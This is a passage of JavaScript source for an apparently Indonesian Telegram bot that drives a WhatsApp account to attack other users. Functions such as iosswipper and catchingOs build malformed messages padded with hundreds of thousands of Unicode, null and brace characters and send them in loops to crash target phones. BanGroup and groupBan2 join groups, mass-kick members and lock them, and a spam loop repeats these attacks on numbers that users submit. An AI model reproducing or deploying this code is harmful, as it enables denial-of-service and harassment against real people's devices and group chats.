        jpegThumbnail: "YWJjZGVmZ2hpamtsbW5vcHFyc3R1dnd4eXphYmNkZWY="
      } } }
    } } }
  }, { participant: target });
}

async function iosswipper(sock, target) {
  const a = " fvck sereη. " + "𑇂𑆵𑆴𑆿".repeat(70000);
  const b = "𑇂𑆵𑆴𑆿".repeat(70000);
  try {
    let c = { degreesLatitude: 11.11, degreesLongitude: -11.11, name: "𑇂𑆵𑆴𑆿".repeat(60000), url: "https://t.me/abcseren" };
    let d = generateWAMessageFromContent(target, { viewOnceMessage: { message: { locationMessagex: c } } }, {});
    let e = { extendedTextMessage: {
      text: b, matchedText: " fvck sereη. ",
      description: "𑇂𑆵𑆴𑆿".repeat(60000), title: "𑇂𑆵𑆴𑆿".repeat(60000),
      previewType: "NONE", jpegThumbnail: "",
      thumbnailDirectPath: "/v/t62.36144-24/32403911_656678750102553_6150409332574546408_n.enc?ccb=11-4&oh=01_Q5AaIZ5mABGgkve1IJaScUxgnPgpztIPf_qlibndhhtKEs9O&oe=680D191A&_nc_sid=5e03e0",
      thumbnailSha256: "eJRYfczQlgc12Y6LJVXtlABSDnnbWHdavdShAWWsrow=",
      thumbnailEncSha256: "pEnNHAqATnqlPAKQOs39bEUXWYO+b9LgFF+aAF0Yf8k=",
      mediaKey: "8yjj0AMiR6+h9+JUSA/EHuzdDTakxqHuSNRmTdjGRYk=",
      mediaKeyTimestamp: "1743101489",
      thumbnailHeight: 641, thumbnailWidth: 640,
      inviteLinkGroupTypeV2: "DEFAULT",
    } };
    let f = generateWAMessageFromContent(target, { viewOnceMessage: { message: { extendMsgx: e } } }, {});
    let g = { degreesLatitude: -9.09999262999, degreesLongitude: 199.99963118999, jpegThumbnail: null,
      name: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(17000), address: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(11000),
      url: `${"𑇂𑆵𑆴𑆿".repeat(28000)}`,
    };
    let h = generateWAMessageFromContent(target, { viewOnceMessage: { message: { locationMessage: g } } }, {});
    let i = { extendedTextMessage: {
      text: a, matchedText: " fvck sereη. ",
      description: "𑇂𑆵𑆴𑆿".repeat(29000),
      title: " fvck sereη. " + "𑇂𑆵𑆴𑆿".repeat(19000),
      previewType: "NONE",
      jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wBDABALDA4MChAODQ4SERATGCgaGBYWGDEjJR0oOjM9PDkzODdASFxOQERXRTc4UG1RV19iZ2hnPk1xeXBkeFxlZ2P/2wBDARESEhgVGC8aGi9jQjhCY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2P/wAARCAABAAEDASIAAhEBAxEB/8QAFQABAQAAAAAAAAAAAAAAAAAAAAb/xAAUEAEAAAAAAAAAAAAAAAAAAAAA/8QAFQEBAQAAAAAAAAAAAAAAAAAAAAX/xAAUEQEAAAAAAAAAAAAAAAAAAAAA/9oADAMBAAIRAxEAPwCdABmX/9k=",
      thumbnailDirectPath: "/v/t62.36144-24/32403911_656678750102553_6150409332574546408_n.enc?ccb=11-4&oh=01_Q5AaIZ5mABGgkve1IJaScUxgnPgpztIPf_qlibndhhtKEs9O&oe=680D191A&_nc_sid=5e03e0",
      thumbnailSha256: "eJRYfczQlgc12Y6LJVXtlABSDnnbWHdavdShAWWsrow=",
      thumbnailEncSha256: "pEnNHAqATnqlPAKQOs39bEUXWYO+b9LgFF+aAF0Yf8k=",
      mediaKey: "8yjj0AMiR6+h9+JUSA/EHuzdDTakxqHuSNRmTdjGRYk=",
      mediaKeyTimestamp: "1743101489",
      thumbnailHeight: 641, thumbnailWidth: 640,
      inviteLinkGroupTypeV2: "DEFAULT",
    } };
    let j = generateWAMessageFromContent(target, { viewOnceMessage: { message: { extendMsg: i } } }, {});
    let k = generateWAMessageFromContent(target, { viewOnceMessage: { message: { locationMessage: g } } }, {});
    for (let i = 0; i < 40; i++) {
      await sock.relayMessage("status@broadcast", d.message, { messageId: d.key.id, statusJidList: [target], additionalNodes: [{ tag: "meta", attrs: {}, content: [{ tag: "mentioned_users", attrs: {}, content: [{ tag: "to", attrs: { jid: target }, content: undefined }] }] }] });
      await sock.relayMessage("status@broadcast", f.message, { messageId: f.key.id, statusJidList: [target], additionalNodes: [{ tag: "meta", attrs: {}, content: [{ tag: "mentioned_users", attrs: {}, content: [{ tag: "to", attrs: { jid: target }, content: undefined }] }] }] });
      await sock.relayMessage("status@broadcast", d.message, { messageId: d.key.id, statusJidList: [target], additionalNodes: [{ tag: "meta", attrs: {}, content: [{ tag: "mentioned_users", attrs: {}, content: [{ tag: "to", attrs: { jid: target }, content: undefined }] }] }] });
      await sock.relayMessage("status@broadcast", f.message, { messageId: f.key.id, statusJidList: [target], additionalNodes: [{ tag: "meta", attrs: {}, content: [{ tag: "mentioned_users", attrs: {}, content: [{ tag: "to", attrs: { jid: target }, content: undefined }] }] }] });
      await sock.relayMessage("status@broadcast", k.message, { messageId: f.key.id, statusJidList: [target], additionalNodes: [{ tag: "meta", attrs: {}, content: [{ tag: "mentioned_users", attrs: {}, content: [{ tag: "to", attrs: { jid: target }, content: undefined }] }] }] });
      if (i < 9) await new Promise((resolve) => setTimeout(resolve, 5000));
    }
  } catch (err) {}
}

async function catchingOs(target) {
  let a = "\u0010";
  let b = "𑇂𑆵𑆴𑆿𑆿".repeat(40000);
  let c = "\u0000".repeat(600000);
  let d = "█".repeat(400000);
  let e = {
    viewOnceMessage: { message: {
      locationMessage: {
        degreesLatitude: -999999.999999, degreesLongitude: 999999.999999,
        name: a + b + c, address: a + b + c,
        url: `${"𑇂𑆵𑆴𑆿".repeat(50000)}`,
        contextInfo: {
          participant: target,
          mentionedJid: Array.from({ length: 8000 }, () => "1" + Math.floor(Math.random() * 999999999) + "@s.whatsapp.net"),
          externalAdReply: { title: d, body: c, mediaType: "VIDEO" },
        },
      },
      nativeFlowMessage: { name: "galaxy_message", paramsJson: "{".repeat(400000) + "}".repeat(400000), version: 3 },
    } },
  };
  let f = generateWAMessageFromContent(target, e, {});
  await global.sock.relayMessage("status@broadcast", f.message, {
    messageId: Date.now(), statusJidList: [target],
    additionalNodes: [{ tag: "meta", attrs: {}, content: [{ tag: "mentioned_users", attrs: {}, content: [{ tag: "to", attrs: { jid: target } }] }] }],
  });
}

// =====================================================
// ================ BAN GROUP ==========================
// =====================================================
async function groupBan2(sock, target) {
  target = String(target);
  let groupJid = target;
  if (!target.endsWith("@g.us")) {
    const inviteCode = target.includes("chat.whatsapp.com/") ? target.split("chat.whatsapp.com/")[1].split(/[?/]/)[0] : target.replace(/[^a-zA-Z0-9]/g, "");
    try { groupJid = await sock.groupAcceptInvite(inviteCode); }
    catch (e) {
      if (e.message.includes("conflict") || e.message.includes("already")) {
        try { const meta = await sock.groupGetInviteInfo(inviteCode); groupJid = meta.id; }
        catch (e2) { console.log(`❌ ${e2.message}`); return false; }
      } else { console.log(`❌ Gagal join grup: ${e.message}`); return false; }
    }
  }
  if (!groupJid || !String(groupJid).endsWith("@g.us")) return false;
  const fakeNumbers = [
    "6280000000000@s.whatsapp.net", "14155552671@s.whatsapp.net",
    "447400000000@s.whatsapp.net", "61400000000@s.whatsapp.net",
    "6281234567890@s.whatsapp.net", "6287873499996@s.whatsapp.net",
    "6285655555555@s.whatsapp.net", "6289876543210@s.whatsapp.net",
    "6281111111111@s.whatsapp.net", "6282222222222@s.whatsapp.net",
    "6283333333333@s.whatsapp.net", "6284444444444@s.whatsapp.net",
    "6285555555555@s.whatsapp.net", "6286666666666@s.whatsapp.net",
    "6287777777777@s.whatsapp.net", "6288888888888@s.whatsapp.net",
    "6289999999999@s.whatsapp.net",
  ];
  const actions = ["add", "remove", "promote", "demote"];
  const fake = fakeNumbers[Math.floor(Math.random() * fakeNumbers.length)];
  const action = actions[Math.floor(Math.random() * actions.length)];
  try { await sock.groupParticipantsUpdate(groupJid, [fake], action); return true; }
  catch (e) { console.log(`❌ Gagal: ${e.message}`); return false; }
}

async function proxzy(sock, jid) {
  for (let i = 0; i < 50; i++) {
    try { await groupBan2(sock, jid); } catch (e) { console.log(`[proxzy] err:`, e.message); }
    await sleep(1500);
  }
}

async function BanGroup(sock, targetJid) {
  let group = targetJid.includes("@g.us") ? targetJid : targetJid + "@g.us";
  let members = await sock.groupMetadata(group);
  for (let i = 0; i < 20; i++) {
    try {
      for (let m of members.participants) {
        let id = m.id;
        if (id !== sock.user.id) {
          await sock.groupParticipantsUpdate(group, [id], "remove");
          await new Promise(r => setTimeout(r, 15));
        }
      }
      await sock.groupParticipantsUpdate(group, ["0@s.whatsapp.net"], "add");
      await new Promise(r => setTimeout(r, 10));
      await sock.groupParticipantsUpdate(group, ["0@s.whatsapp.net"], "remove");
      await sock.sendMessage(group, { text: "\u200B".repeat(3000) + "\u0000".repeat(3000) + "\u202E".repeat(1000) });
      await sock.groupSettingsUpdate(group, "announcement", true);
      await sock.groupSettingsUpdate(group, "locked", true);
    } catch (e) {}
  }
}

// =====================================================
// ============ SPAM LOOP ==============================
// =====================================================
const activeSpam = new Map();
let spamCounter = 0;

async function spamForever(ctx, label, target, tasks) {
  const userId = ctx.from.id.toString();
  const userName = ctx.from.username ? `@${ctx.from.username}` : ctx.from.first_name || "User";
  const jobId = `${userId}_${++spamCounter}`;
  const groupId = ctx.chat?.type !== "private" ? ctx.chat.id : null;

  activeSpam.set(jobId, { userId, userName, label, target, stop: false, stats: { ok: 0, fail: 0 }, startAt: Date.now(), iterasi: 0 });
  try { logStatsStart(userId, userName, label, target, groupId); } catch {}
  addLog("BUG_START", `${userName} → ${label} → ${target.split("@")[0]}`, userId);

  const startAt = Date.now();
  let iterasi = 0;

  await ctx.telegram.sendMessage(ctx.chat.id,
    `🚀 <b>${label}</b> start ke <code>${target.split("@")[0]}</code>\n🆔 Job: <code>${jobId}</code>\n\nKetik /stopbug buat berhentiin.`,
    { parse_mode: "HTML" }
  ).catch(() => {});

  while (true) {
    const state = activeSpam.get(jobId);
    if (!state || state.stop) {
      const durasi = Math.floor((Date.now() - startAt) / 1000);
      await ctx.telegram.sendMessage(ctx.chat.id,
        `🛑 <b>${label}</b> (${jobId}) dihentikan\n\n✅ Sukses : ${state?.stats.ok || 0}\n❌ Gagal  : ${state?.stats.fail || 0}\n⏱ Durasi : ${durasi}s`,
        { parse_mode: "HTML" }
      ).catch(() => {});
      try { logStatsFinish(userId, state?.stats.ok || 0, state?.stats.fail || 0); } catch {}
      bot.telegram.sendMessage(ownerID,
        `✅ <b>JOB SELESAI</b>\n\n👤 ${userName}\n🆔 ${jobId}\n🎯 ${target.split("@")[0]}\n⚙️ ${label}\n\n✅ ${state?.stats.ok || 0} | ❌ ${state?.stats.fail || 0} | ⏱ ${durasi}s`,
        { parse_mode: "HTML" }
      ).catch(() => {});
      activeSpam.delete(jobId);
      return;
    }
    iterasi++;
    state.iterasi = iterasi;
    let semuaOk = true;
    for (const t of tasks) {
      try { await t.fn(); } catch (e) { semuaOk = false; }
    }
    if (semuaOk) state.stats.ok++; else state.stats.fail++;
    if (iterasi % 10 === 0) {
      const durasi = Math.floor((Date.now() - startAt) / 1000);
      await ctx.telegram.sendMessage(ctx.chat.id,
        `📊 <b>${label}</b> (${jobId})\n\n🔄 Iterasi : ${iterasi}\n✅ Sukses  : ${state.stats.ok}\n❌ Gagal   : ${state.stats.fail}\n⏱ Durasi  : ${durasi}s`,
        { parse_mode: "HTML" }
      ).catch(() => {});
    }
    await sleep(1500);
  }
}

// [PART 2 nyusul...]
// =====================================================
// ============ IN MEMORY / QUEUE ======================
// =====================================================
function makeInMemoryStore() {
  const ev = new EventEmitter();
  const chats = {}, messages = {}, contacts = {};
  ev.on("messages.upsert", ({ messages: nm }) => {
    for (const msg of nm) {
      const id = msg.key.remoteJid;
      messages[id] = messages[id] || [];
      messages[id].push(msg);
      if (messages[id].length > 50) messages[id].shift();
    }
  });
  return { chats, messages, contacts, bind: (t) => t.on("messages.upsert", (m) => ev.emit("messages.upsert", m)) };
}
class TaskQueue {
  constructor() { this.q = []; this.busy = false; }
  add(job) { this.q.push(job); this.run(); }
  async run() {
    if (this.busy) return;
    this.busy = true;
    while (this.q.length) {
      const job = this.q.shift();
      try { await job(); } catch (e) { console.error("task err:", e.message); }
    }
    this.busy = false;
  }
}
const queue = new TaskQueue();

// ---------- COOLDOWN ----------
const cooldownFile = "./database/cooldown.json";
const loadCooldown = () => { try { return JSON.parse(fs.readFileSync(cooldownFile)).cooldown || 5; } catch { return 5; } };
const saveCooldown = (s) => fs.writeFileSync(cooldownFile, JSON.stringify({ cooldown: s }, null, 2));
let cooldown = loadCooldown();
const userCooldowns = new Map();

// =====================================================
// ============ WHATSAPP SESSION =======================
// =====================================================
async function startSesi() {
  console.clear();
  console.log(chalk.bold.yellow(`
  ⬡═—⊱ CHECKING SERVER ⊰—═⬡
  ┃ Bot Sukses Terhubung, Makasih
  ⬡═―—―――――――――――――――――—═⬡
  `));
  const store = makeInMemoryStore();
  const { state, saveCreds } = await useMultiFileAuthState("./session");
  const { version } = await fetchLatestBaileysVersion();

  sock = makeWASocket({
    version, keepAliveIntervalMs: 30000,
    printQRInTerminal: !usePairingCode,
    logger: pino({ level: "silent" }),
    auth: state,
    browser: ["Mac OS", "Safari", "5.15.7"],
    getMessage: async () => ({ conversation: "Apophis" }),
  });
  global.sock = sock;
  sock.ev.on("creds.update", saveCreds);
  store.bind(sock.ev);

  sock.ev.on("connection.update", ({ connection, lastDisconnect }) => {
    if (connection === "open") {
      if (lastPairingMessage) {
        const txt = `<blockquote><pre>
⬡═―—⊱ ⎧ HEFAISTOS HADES ⎭ ⊰―—═⬡
⌑ Number       : ${lastPairingMessage.phoneNumber}
⌑ Pairing Code : ${lastPairingMessage.pairingCode}
⌑ Type         : Sudah Terhubung
╘—————————————————═⬡
</pre></blockquote>`;
        bot.telegram.editMessageCaption(lastPairingMessage.chatId, lastPairingMessage.messageId, undefined, txt, { parse_mode: "HTML" }).catch(() => {});
      }
      isWhatsAppConnected = true;
      console.log(chalk.bold.yellow(`
  ⬡═—⊱ SENDER ONLINE ⊰—═⬡
  ┃ Sukses Terhubung, Terima Kasih
  ⬡═―—―――――――――――――――――—═⬡
  `));
    }
    if (connection === "close") {
      const reconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
      if (isWhatsAppConnected) {
        bot.telegram.sendMessage(ownerID, `⚠️ <b>SENDER DOWN</b>\n\nWA disconnect. Mencoba reconnect...`, { parse_mode: "HTML" }).catch(() => {});
      }
      if (reconnect) startSesi();
      isWhatsAppConnected = false;
    }
  });
}
startSesi();

// =====================================================
// ============ MIDDLEWARE =============================
// =====================================================
const checkWhatsAppConnection = (ctx, next) => {
  if (!isWhatsAppConnected) return ctx.reply("🪧 ☇ Tidak ada sender yang terhubung");
  next();
};
const checkCooldown = (ctx, next) => {
  const id = ctx.from.id;
  const now = Date.now();
  if (userCooldowns.has(id)) {
    const diff = (now - userCooldowns.get(id)) / 500;
    if (diff < cooldown) return ctx.reply(`⏳ Sabar dulu ${Math.ceil(cooldown - diff)} detik ya.`);
  }
  userCooldowns.set(id, now);
  next();
};
const premGroupOnly = () => async (ctx, next) => {
  if (ctx.chat?.type === "private") return ctx.reply("❌ Khusus user premium atau grup premium.");
  if (!isPremGroup(ctx.chat.id)) {
    const t = esc(ctx.chat?.title || "Grup ini");
    return ctx.reply(`❌ <b>${t}</b> belum terdaftar sebagai <b>GRUP PREMIUM</b>.`, { parse_mode: "HTML" });
  }
  next();
};

// middleware maintenance & banned
bot.use(async (ctx, next) => {
  if (!ctx.from) return next();
  if (String(ctx.from.id) === String(ownerID)) return next();
  if (maintenanceMode) return ctx.reply("🔧 Bot sedang maintenance.").catch(() => {});
  if (isBanned(ctx.from.id)) return ctx.reply("🚫 Kamu dibanned dari bot ini.").catch(() => {});

  ensureUser(ctx.from);

  const text = ctx.message?.text || "";
  if (text.startsWith("/start ")) {
    const code = text.split(" ")[1];
    if (code && code.startsWith("REF")) {
      const ok = setReferral(ctx.from.id, code);
      if (ok) ctx.reply("✅ Kode referral berhasil dipakai!").catch(() => {});
    }
  }
  if (text.startsWith("/")) {
    const c = normCmd(text.split(" ")[0].split("@")[0]);
    if (c) logCmd(c);
  }
  return next();
});

// =====================================================
// ============ KEYBOARDS ==============================
// =====================================================
const START_KEYBOARD = [[
  { text: "Open Menu", callback_data: "/setting_menu", style: "success" },
]];

const SETTING_KEYBOARD = [
  [
    { text: "Back", callback_data: "/start", style: "danger" },
    { text: "Bug Menu", callback_data: "/bug_menu", style: "success" },
  ],
  [
    { text: "Bug Poll", callback_data: "/bug_poll_menu", style: "primary" },
    { text: "Ban Group", callback_data: "/ban_menu", style: "danger" },
  ],
  [
    { text: "Grup",   callback_data: "/group_menu",  style: "success" },
    { text: "Member", callback_data: "/member_menu", style: "primary" },
  ],
  [
    { text: "Admin", callback_data: "/admin_menu", style: "danger" },
  ],
];

const BUG_KEYBOARD = [
  [
    { text: "Back", callback_data: "/setting_menu", style: "danger" },
    { text: "Home", callback_data: "/start", style: "primary" },
  ],
];

const BAN_KEYBOARD = [
  [
    { text: "Ban Poll", callback_data: "/ban_poll_menu", style: "success" },
  ],
  [
    { text: "Back", callback_data: "/setting_menu", style: "danger" },
    { text: "Home", callback_data: "/start", style: "primary" },
  ],
];

// =====================================================
// ============ POLL STORE =============================
// =====================================================
const activeBanPolls   = new Map();
const userLastBanPoll  = new Map();
const activeBugPolls   = new Map();
const userLastBugPoll  = new Map();

// =====================================================
// ============ PENDING STATE ==========================
// =====================================================
const pendingBugUser    = new Map();
const pendingBanUser    = new Map();
const pendingGroupAsk   = new Map();

// =====================================================
// ============ HELPERS GRUP ===========================
// =====================================================
async function resolveWaGroup(input) {
  if (!input) return null;
  input = input.trim();
  if (input.endsWith("@g.us")) return input;
  if (input.includes("chat.whatsapp.com/")) {
    const code = input.split("chat.whatsapp.com/")[1].split(/[?/]/)[0];
    try { const meta = await sock.groupGetInviteInfo(code); return meta.id; }
    catch { return null; }
  }
  return null;
}
async function fetchGroupInfo(groupJid) { try { return await sock.groupMetadata(groupJid); } catch { return null; } }

function groupInfoHtml(meta) {
  const admins = meta.participants.filter((p) => p.admin);
  const creation = meta.creation ? moment.unix(meta.creation).tz("Asia/Jakarta").format("DD-MM-YYYY HH:mm") : "-";
  return `
<h1>👥 Info Grup</h1>
<p><i>${esc(meta.subject || "Tanpa Nama")}</i></p>
<hr/>
<table>
  <tr><th>Komponen</th><th>Nilai</th></tr>
  <tr><td>ID Grup</td><td><code>${meta.id}</code></td></tr>
  <tr><td>Total Member</td><td><b>${meta.participants.length}</b></td></tr>
  <tr><td>Total Admin</td><td><b>${admins.length}</b></td></tr>
  <tr><td>Status</td><td><b>${meta.announce ? "Locked" : "Open"}</b></td></tr>
  <tr><td>Dibuat</td><td><code>${creation}</code></td></tr>
  <tr><td>Owner</td><td><code>${meta.owner ? meta.owner.split("@")[0] : "-"}</code></td></tr>
</table>
`.trim();
}
function adminListHtml(meta) {
  const admins = meta.participants.filter((p) => p.admin);
  const rows = admins.length ? admins.map((a, i) => `<tr><td>${i + 1}. <code>${a.id.split("@")[0]}</code></td><td>${a.admin === "superadmin" ? "Owner" : "Admin"}</td></tr>`).join("") : `<tr><td colspan="2"><i>Gak ada admin</i></td></tr>`;
  return `<h1>👑 List Admin</h1>\n<p><i>${esc(meta.subject)}</i></p>\n<hr/>\n<table>\n<tr><th>Nomor</th><th>Jabatan</th></tr>\n${rows}\n</table>`.trim();
}
function memberListHtml(meta) {
  const members = meta.participants.slice(0, 30);
  const rows = members.length ? members.map((m, i) => `<tr><td>${i + 1}. <code>${m.id.split("@")[0]}</code></td><td>${m.admin ? "Admin" : "Member"}</td></tr>`).join("") : `<tr><td colspan="2"><i>Belum ada</i></td></tr>`;
  const more = meta.participants.length > 30 ? `<p><i>...dan ${meta.participants.length - 30} lainnya</i></p>` : "";
  return `<h1>👥 List Member</h1>\n<p><i>${esc(meta.subject)} (${meta.participants.length})</i></p>\n<hr/>\n<table>\n<tr><th>Nomor</th><th>Status</th></tr>\n${rows}\n</table>\n${more}`.trim();
}

// =====================================================
// ============ /start =================================
// =====================================================
bot.start(async (ctx) => {
  const userId = ctx.from.id;
  const senderStatus = isWhatsAppConnected ? "Aktif" : "Tidak Aktif";
  const userFirst = ctx.from.first_name || ctx.from.username || "Kak";
  const premiumStatus = isPremiumUser(userId) ? "Premium" : "Free";
  const html = `
<h1>⚔️ Hefaistos Hades</h1>
<p><i>System Control • WhatsApp Bug Bot v2</i></p>
<img src="${thumbnailUrl}" alt="banner"/>
<hr/>
<p>Halo <b>${esc(userFirst)}</b> 👋</p>
<h2>📊 Status System</h2>
<table>
  <tr><th>Komponen</th><th>Status</th></tr>
  <tr><td>Sender</td><td><b>${senderStatus}</b></td></tr>
  <tr><td>Runtime</td><td><code>${formatRuntime()}</code></td></tr>
  <tr><td>Memory</td><td><code>${formatMemory()}</code></td></tr>
  <tr><td>Akses Kamu</td><td><b>${premiumStatus}</b></td></tr>
</table>
<hr/>
<p>Tekan tombol <b>Open Menu</b> buat mulai.</p>
`.trim();
  try {
    await ctx.telegram.callApi("sendRichMessage", { chat_id: ctx.chat.id, rich_message: { html }, reply_markup: { inline_keyboard: START_KEYBOARD } });
  } catch {
    await ctx.replyWithPhoto(thumbnailUrl, {
      caption: `⚔️ HEFAISTOS HADES\nSender: ${senderStatus}\nRuntime: ${formatRuntime()}`,
      reply_markup: { inline_keyboard: START_KEYBOARD },
    });
  }
});

bot.action("/start", async (ctx) => {
  await ctx.answerCbQuery();
  const userFirst = ctx.from.first_name || ctx.from.username || "Kak";
  const senderStatus = isWhatsAppConnected ? "Aktif" : "Tidak Aktif";
  const html = `
<h1>⚔️ Hefaistos Hades</h1>
<hr/>
<p>Halo <b>${esc(userFirst)}</b> 👋</p>
<table>
  <tr><th>Status</th><th>Nilai</th></tr>
  <tr><td>Sender</td><td><b>${senderStatus}</b></td></tr>
  <tr><td>Runtime</td><td><code>${formatRuntime()}</code></td></tr>
  <tr><td>Akses</td><td><b>${isPremiumUser(ctx.from.id) ? "Premium" : "Free"}</b></td></tr>
</table>
`.trim();
  try {
    await ctx.telegram.callApi("editMessageText", {
      chat_id: ctx.chat.id, message_id: ctx.callbackQuery.message.message_id,
      rich_message: { html }, reply_markup: { inline_keyboard: START_KEYBOARD },
    });
  } catch (e) {}
});

bot.action("/setting_menu", async (ctx) => {
  await ctx.answerCbQuery();
  const msgId = ctx.callbackQuery.message.message_id;
  const html = `
<h2>☰ SYSTEM CONTROL PANEL</h2>
<img src="${thumbnailUrl}" alt="banner"/>
<hr/>
<h3>Menu Utama</h3>
<ul>
  <li>Bug Menu — list command</li>
  <li>Bug Poll — pilih bug via poll</li>
  <li>Ban Group — ban via poll</li>
</ul>
<h3>Grup / Member / Admin</h3>
<ul>
  <li>Grup — aksi grup WA</li>
  <li>Member — fitur member</li>
  <li>Admin — fitur admin</li>
</ul>
`.trim();
  try {
    await ctx.telegram.callApi("editMessageText", {
      chat_id: ctx.chat.id, message_id: msgId, rich_message: { html },
      reply_markup: { inline_keyboard: SETTING_KEYBOARD },
    });
  } catch (e) {}
});

bot.action("/bug_menu", async (ctx) => {
  await ctx.answerCbQuery();
  const msgId = ctx.callbackQuery.message.message_id;
  const html = `
<h2>🐛 BUG MENU</h2>
<img src="${thumbnailUrl}" alt="banner"/>
<hr/>
<ul>
  <li>/delayhard — Delay Hard</li>
  <li>/ghost — Delay Ghost</li>
  <li>/forceclose — Force Close</li>
  <li>/forcezz — Force Zezz</li>
  <li>/xdios — Delay Xdios</li>
  <li>/bug — Crash bug (pilih dari tombol)</li>
  <li>/stopbug — Stop semua spam</li>
</ul>
`.trim();
  try {
    await ctx.telegram.callApi("editMessageText", {
      chat_id: ctx.chat.id, message_id: msgId, rich_message: { html },
      reply_markup: { inline_keyboard: BUG_KEYBOARD },
    });
  } catch (e) {}
});

bot.action("/ban_menu", async (ctx) => {
  await ctx.answerCbQuery();
  const msgId = ctx.callbackQuery.message.message_id;
  const html = `
<h2>🔥 BAN GROUP</h2>
<img src="${thumbnailUrl}" alt="banner"/>
<hr/>
<p><b>Metode:</b></p>
<ul>
  <li>End GB v1 — Join + Spam Action</li>
  <li>End GB v2 — Kick All + Lock</li>
</ul>
<p><i>Klik <b>Ban Poll</b> di bawah buat pilih lewat poll.</i></p>
`.trim();
  try {
    await ctx.telegram.callApi("editMessageText", {
      chat_id: ctx.chat.id, message_id: msgId, rich_message: { html },
      reply_markup: { inline_keyboard: BAN_KEYBOARD },
    });
  } catch (e) {}
});

// =====================================================
// ============ BUG POLL ===============================
// =====================================================
bot.action("/bug_poll_menu", async (ctx) => {
  const userId = ctx.from.id;
  const chatId = ctx.chat.id;
  await ctx.answerCbQuery("Buka poll bug");
  const oldId = userLastBugPoll.get(userId);
  if (oldId) {
    const old = activeBugPolls.get(oldId);
    if (old) { bot.telegram.deleteMessage(old.chatId, old.msgId).catch(() => {}); activeBugPolls.delete(oldId); }
    userLastBugPoll.delete(userId);
  }
  await ctx.replyWithPhoto(thumbnailUrl, {
    caption: `🐛 <b>BUG POLL</b>\n\nPilih jenis bug lewat vote di bawah, terus kirim nomor target.`,
    parse_mode: "HTML",
    reply_markup: { inline_keyboard: [[{ text: "Back", callback_data: "/setting_menu", style: "danger" }]] },
  }).catch(() => {});
  const pollMsg = await ctx.telegram.sendPoll(chatId, "🐛 Pilih bug:",
    ["Forceclose", "Delayhard", "Ghost", "Forcezz", "Xdios"],
    { is_anonymous: false, allows_multiple_answers: false, open_period: 300 }
  ).catch(() => null);
  if (!pollMsg || !pollMsg.poll) return;
  activeBugPolls.set(pollMsg.poll.id, { chatId, msgId: pollMsg.message_id, userId });
  userLastBugPoll.set(userId, pollMsg.poll.id);
});

// =====================================================
// ============ BAN POLL ===============================
// =====================================================
bot.action("/ban_poll_menu", async (ctx) => {
  const userId = ctx.from.id;
  const chatId = ctx.chat.id;
  await ctx.answerCbQuery("Buka poll ban");
  const oldId = userLastBanPoll.get(userId);
  if (oldId) {
    const old = activeBanPolls.get(oldId);
    if (old) { bot.telegram.deleteMessage(old.chatId, old.msgId).catch(() => {}); activeBanPolls.delete(oldId); }
    userLastBanPoll.delete(userId);
  }
  await ctx.replyWithPhoto(thumbnailUrl, {
    caption: `💢 <b>BAN POLL</b>\n\nPilih metode ban, terus kirim link grupnya.`,
    parse_mode: "HTML",
    reply_markup: { inline_keyboard: [[{ text: "Back", callback_data: "/ban_menu", style: "danger" }]] },
  }).catch(() => {});
  const pollMsg = await ctx.telegram.sendPoll(chatId, "🔥 Pilih metode ban:",
    ["End GB v1", "End GB v2"],
    { is_anonymous: false, allows_multiple_answers: false, open_period: 300 }
  ).catch(() => null);
  if (!pollMsg || !pollMsg.poll) return;
  activeBanPolls.set(pollMsg.poll.id, { chatId, msgId: pollMsg.message_id, userId });
  userLastBanPoll.set(userId, pollMsg.poll.id);
});

// =====================================================
// ============ POLL ANSWER ============================
// =====================================================
bot.on("poll_answer", async (ctx) => {
  const ans = ctx.pollAnswer;

  const sBug = activeBugPolls.get(ans.poll_id);
  if (sBug) {
    const idx = ans.option_ids[0];
    if (idx === undefined) return;
    const options = ["forceclose", "delayhard", "ghost", "forcezz", "xdios"];
    const labels = { forceclose: "Forceclose", delayhard: "Delayhard", ghost: "Ghost", forcezz: "Forcezz", xdios: "Xdios" };
    const bugName = options[idx]; const label = labels[bugName];
    if (!bugName) return;
    const userId = ans.user.id;
    bot.telegram.deleteMessage(sBug.chatId, sBug.msgId).catch(() => {});
    activeBugPolls.delete(ans.poll_id);
    userLastBugPoll.delete(userId);
    pendingBugUser.set(userId, bugName);
    await bot.telegram.sendMessage(sBug.chatId,
      `✅ <b>${label}</b> dipilih.\n\nKirim nomornya sekarang (contoh: <code>628xxxxxxxx</code>).`,
      { parse_mode: "HTML" }
    ).catch(() => {});
    return;
  }

  const s = activeBanPolls.get(ans.poll_id);
  if (s) {
    const idx = ans.option_ids[0];
    if (idx === undefined) return;
    const options = ["endgb", "endgbv2"];
    const labels = { endgb: "End GB v1", endgbv2: "End GB v2" };
    const banName = options[idx]; const label = labels[banName];
    if (!banName) return;
    const userId = ans.user.id;
    bot.telegram.deleteMessage(s.chatId, s.msgId).catch(() => {});
    activeBanPolls.delete(ans.poll_id);
    userLastBanPoll.delete(userId);
    pendingBanUser.set(userId, banName);
    await bot.telegram.sendMessage(s.chatId,
      `✅ <b>${label}</b> dipilih.\n\nKirim link grupnya sekarang (contoh: <code>https://chat.whatsapp.com/xxxxx</code>).`,
      { parse_mode: "HTML" }
    ).catch(() => {});
    return;
  }
});

// =====================================================
// ============ GRUP MENU ==============================
// =====================================================
const GROUP_KEYBOARD = [
  [
    { text: "Info Grup",  callback_data: "/ginfo_btn",   style: "primary" },
    { text: "List Admin", callback_data: "/gadmin_btn",  style: "success" },
  ],
  [
    { text: "List Member", callback_data: "/gmember_btn", style: "primary" },
    { text: "Invite Link", callback_data: "/ginvite_btn", style: "success" },
  ],
  [
    { text: "Lock Grup",  callback_data: "/glock_btn",  style: "danger" },
    { text: "Unlock Grup", callback_data: "/gunlock_btn", style: "success" },
  ],
  [
    { text: "Back", callback_data: "/setting_menu", style: "danger" },
    { text: "Home", callback_data: "/start", style: "primary" },
  ],
];

bot.action("/group_menu", async (ctx) => {
  await ctx.answerCbQuery();
  const msgId = ctx.callbackQuery.message.message_id;
  const html = `
<h2>👥 Group Menu</h2>
<p><i>Aksi grup WhatsApp</i></p>
<img src="${thumbnailUrl}" alt="banner"/>
<hr/>
<h3>📋 Command Manual</h3>
<ul>
  <li><code>/ginfo LINK</code> — Info grup</li>
